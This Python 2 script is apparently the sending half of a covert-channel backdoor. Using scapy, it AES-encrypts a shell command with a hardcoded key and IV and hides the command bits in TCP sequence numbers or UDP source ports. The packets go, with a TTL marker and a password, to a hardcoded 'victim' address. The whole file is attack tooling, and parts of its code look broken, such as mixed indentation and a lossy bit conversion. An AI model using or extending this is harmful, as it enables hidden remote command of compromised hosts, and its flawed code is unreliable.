
#Dependancies
from scapy.all import *
from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
import uuid #Used to generate UID's

#Inputs
victimIP = "192.168.0.2"
ttlKey = 164
srcPort = 80
dstPort = 8000
encryptionKey = "0123456789abcdef"
IV = "abcdefghijklmnop"
protocol = "TCP"
password = "TEST!"


#Encrypt the message
def encrypt(message):
    global encryptionKey
    global IV
    encryptionKey = encryptionKey
    IV = IV
    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(message)

#Conver the message to ascii to bits
def messageToBits(message):
	messageData = ''.join(str(ord(c)) for c in message)
	#convert string to binary
	messageData = bin(int(messageData))[2:]
	return messageData

def chunkMessage(message,protocol):
	if(protocol == "TCP"):
		length = 32
	elif(protocol == "UDP"):
		length = 16

	print str(len(message))
	if(len(message) == length ):
		output = []
		output.append(message)
		return message
	elif(len(message) < length):
		return message.zfill(length)
	elif(len(message) > length):
		rounds = len(message) / length
        #What will be left over after we chunk the length bit chunks
        excess = len(message) % length
        print "Rounds is " + str(rounds)
        output = []
        i = 0
        start = 0
        end = 0
        while(i < rounds):
            #print "This is round" + str(i)
            start = i*length
            end = (i*length)+(length - 1)
            output.append(message[start:end])
            i = i + 1
        #Get the remainder
        output.append(message[(end+1):(end+1+excess)])
        return output

def generateUID():
    uid = uuid.uuid1()
    print 'Made a UID ' + str(uid)
    return str(uid)


def craftPackets(data,protocol):
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()
    while (counter < len(data)):
        packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID))
        counter = counter + 1

    return packets

def craftPacket(data,protocol,position,total,UID):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    global password


    print "Crafting packet for # " + str(position) + " / " + str(total)
    if(protocol == "TCP"):
        packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
        seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    elif(protocol == "UDP"):
        packet = IP(dst=victimIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
        dport=dstPort)/Raw(load=encrypt(password+"\n"+UID+"\n"+ str(position) + \
         ":"+str(total)))
    return packet

def sendmessage(protocol,message):
	global victimIP
	global ttlKey
	global srcPort
	global dstPort
	global encryptionKey
	global IV

	#1. Encrypt the message
	message = encrypt(message)

	#2. Convert message to ASCII to Bits
	message = messageToBits(message)

	#3. Chunk message into the size appropriate for the procol
	chunks = chunkMessage(message,protocol)

	#4. Craft packets
	packets = craftPackets(chunks,protocol)

	#5. Send the packets
	for packet in packets:
		send(packet)
		pass


#Main
message = "iptables -L"
sendmessage("UDP",message)